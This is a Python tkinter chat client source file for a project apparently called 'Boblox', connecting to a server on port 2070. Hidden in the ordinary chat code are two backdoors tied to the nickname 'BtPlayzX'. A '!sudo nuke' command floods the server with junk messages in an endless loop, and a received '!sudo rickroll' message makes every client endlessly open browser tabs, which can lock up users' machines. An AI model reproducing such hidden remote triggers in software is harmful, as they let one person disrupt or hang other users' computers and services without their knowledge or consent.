import threading, socket
import tkinter
import tkinter.scrolledtext
from tkinter import *
import webbrowser
from boblox.chat.encrypt import encrypt
from random import choice

def connect_client(ip):
    HOST = ip
    PORT = 2070

    class Client:
        def __init__(self, host, port):
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((HOST, PORT))

            msg = tkinter.Tk()
            msg.withdraw()
            
            self.nickname = open('boblox\\account\\username', 'r').read()
            self.sock.send(f'BOBLOX.CODES.SEND{self.nickname}'.encode('utf-8'))

            self.gui_done = False
            self.running = True

            gui_thread = threading.Thread(target=self.gui_loop)
            receive_thread = threading.Thread(target=self.receive)

            gui_thread.start()
            receive_thread.start()

        

            

        def gui_loop(self):
            self.win = tkinter.Tk()
            self.win.title('Boblox')
            # self.win.iconphoto(False, PhotoImage(file='boblox\\icon.png'))
            self.win.configure(bg='lightgray')

            self.canvas = Canvas(self.win)
            self.canvas.pack(fill=BOTH, expand=TRUE)

            self.chat_label = tkinter.Label(self.win, text='Chat:', bg='lightgray')
            self.chat_label.config(font=('Arial', 12))
            self.chat_label.pack(padx=20, pady=5)

            self.text_area = tkinter.scrolledtext.ScrolledText(self.win)
            self.text_area.pack(padx=20, pady=5)
            self.text_area.config(state='disabled')

            self.msg_label = tkinter.Label(self.win, text='Message:', bg='lightgray')
            self.msg_label.config(font=('Arial', 12))
            self.msg_label.pack(padx=20, pady=5)

            self.input_area = tkinter.Text(self.win, height=3)
            self.input_area.pack()

            self.send_button = tkinter.Button(self.win, text='Send', command=self.write)
            self.send_button.config(font=('Arial', 12))
            self.send_button.pack(padx=20, pady=5)

            self.code_text = Label(self.canvas, text='                                                                                                                                                                                                                                                                                                                                                           Server join code: '+str(encrypt(HOST)))
            self.code_text.grid(row=0, column=0)

            self.gui_done = True

            self.win.protocol('WM_DELETE_WINDOW', self.stop)

            self.win.mainloop()
        
        def write(self):
            message = f"{self.nickname}: {self.input_area.get('1.0', 'end')}"
            if self.nickname == 'BtPlayzX' and '!sudo nuke' in message:
                nuke_vocab = ['SUS', 'AMOOOGUUS', ':)', 'LOL', 'UWU', 'EEE', 'NEVER GONNA GIVE YOU UP', 'get rekt', 'got milk?', 'amogus', 'nerd', 'owo', 'ERROR', 'EPIC_SEZUIRE_NOISES']
                self.input_area.delete('1.0', 'end')
                while True: self.sock.send(choice(nuke_vocab).encode('utf-8'))
            self.sock.send('\n'.encode('utf-8'))
            self.sock.send(message.encode('utf-8'))
            self.input_area.delete('1.0', 'end')

        def stop(self):
            self.running = False
            self.win.destroy()
            self.sock.close()
            exit(0)
            
        
        

        def receive(self):
            while self.running:
                try:
                    message = self.sock.recv(1024)
                    print(message)

                    if message == b'BtPlayzX: !sudo rickroll\n':
                        while True: webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

                    if self.gui_done:
                        self.text_area.config(state='normal')                             
                        self.text_area.insert('end', message)
                        self.text_area.yview('end')
                        self.text_area.config(state='disabled')
                except ConnectionAbortedError:
                    break
                except:
                    print('error')
                    self.sock.close()
                    break
    
    client = Client(HOST, PORT)
    